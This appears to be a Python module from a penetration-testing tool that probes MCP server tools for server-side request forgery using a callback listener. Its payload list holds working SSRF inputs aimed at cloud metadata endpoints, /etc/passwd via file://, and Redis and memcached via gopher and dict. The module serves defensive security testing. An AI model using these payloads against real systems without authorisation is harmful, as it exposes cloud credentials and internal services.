"""Server-Side Request Forgery tests via MCP tools"""
import threading
import uuid
import time
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler


class SSRFTest:
    """Detect SSRF by injecting URLs pointing to controlled listener"""
    
    def __init__(self, pentester):
        self.pentester = pentester
        self.server = None
        self.server_port = 8888
        self.captured_callbacks = {}
        self.callbacks_lock = threading.Lock()
        
    SSRF_PAYLOADS = [
        # Localhost probing
        "http://127.0.0.1:{port}/ssrf-test",
        "http://localhost:{port}/ssrf-test",
        "http://[::1]:{port}/ssrf-test",
        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        # DNS rebinding / internal
        "http://0.0.0.0:{port}/ssrf-test",
        "http://localtest.me:{port}/ssrf-test",
        # Protocol smuggling
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    
    def _start_persistent_listener(self):
        """Start HTTP callback listener"""
        parent = self
        
        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if '/callback/' in self.path:
                    token = self.path.split('/callback/')[-1].split('/')[0]
                    with parent.callbacks_lock:
                        parent.captured_callbacks[token] = {
                            'path': self.path,
                            'headers': dict(self.headers),
                            'time': time.time()
                        }
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'SSRF-CONFIRMED')
            
            def log_message(self, *args): pass
        
        # Try OS-assigned port first, then increment if in use
        port = 0
        for attempt in range(10):
            try:
                self.server = HTTPServer(('0.0.0.0', port), CallbackHandler)
                self.server_port = self.server.server_address[1]
                break
            except OSError as e:
                logging.debug(f"Port {port} unavailable: {e}")
                port = 8888 + attempt
            except Exception as e:
                logging.error(f"Unexpected error binding port {port}: {e}")
                return
        
        if not self.server:
            logging.error("Failed to start SSRF listener on any port")
            return
        
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.daemon = True
        thread.start()
    
    def run(self, tool):
        """Test tool arguments for SSRF vulnerabilities"""
        self.pentester.health_check()
        findings = []
        
        if not self.server:
            self._start_persistent_listener()
        
        if not self.server:
            logging.error("Skipping SSRF tests: Could not start listener.")
            return []
        
        schema = tool.get('inputSchema', {})
        url_args = self._find_url_args(schema)
        
        for arg in url_args:
            for payload_template in self.SSRF_PAYLOADS:
                token = str(uuid.uuid4())[:8]
                
                if '{port}' in payload_template:
                    payload = payload_template.format(port=self.server_port)
                else:
                    payload = payload_template
                
                if payload.startswith('http'):
                    payload = payload.rstrip('/') + f'/callback/{token}'
                
                try:
                    params = {"name": tool['name'], "arguments": {arg: payload}}
                    resp, _ = self.pentester.send("tools/call", params)
                    
                    with self.callbacks_lock:
                        if token in self.captured_callbacks:
                            findings.append({
                                'type': 'SSRF_CALLBACK',
                                'tool': tool['name'],
                                'arg': arg,
                                'payload': payload,
                                'callback_data': self.captured_callbacks[token],
                                'severity': 'CRITICAL'
                            })
                    
                    content = str(resp)
                    if self._detect_ssrf_response(content, payload):
                        findings.append({
                            'type': 'SSRF_RESPONSE',
                            'tool': tool['name'],
                            'arg': arg,
                            'payload': payload,
                            'response_snippet': content[:500],
                            'severity': 'CRITICAL'
                        })
                except (OSError, ValueError, TypeError, AttributeError, KeyError) as e:
                    logging.debug(f"SSRF test error for {tool['name']}.{arg}: {e}")
        
        return findings
    
    def _find_url_args(self, schema):
        """Identify arguments likely to accept URLs"""
        url_hints = ['url', 'uri', 'href', 'link', 'endpoint', 'host', 'target', 'source']
        args = []
        for prop, spec in schema.get('properties', {}).items():
            if any(hint in prop.lower() for hint in url_hints):
                args.append(prop)
            elif spec.get('format') == 'uri':
                args.append(prop)
        return args or list(schema.get('properties', {}).keys())  # Fallback: test all
    
    def _detect_ssrf_response(self, content, payload):
        """Detect SSRF via response content analysis"""
        indicators = [
            'ami-id', 'instance-id',  # AWS metadata
            'computeMetadata',        # GCP metadata
            'SSRF-CONFIRMED',         # Our canary
            'redis_version',          # Redis info
        ]
        return any(ind in content for ind in indicators)
    
    def cleanup(self):
        """Stop HTTP listener and cleanup resources"""
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception as e:
                logging.debug(f"Error during SSRF listener cleanup: {e}")
            finally:
                self.server = None
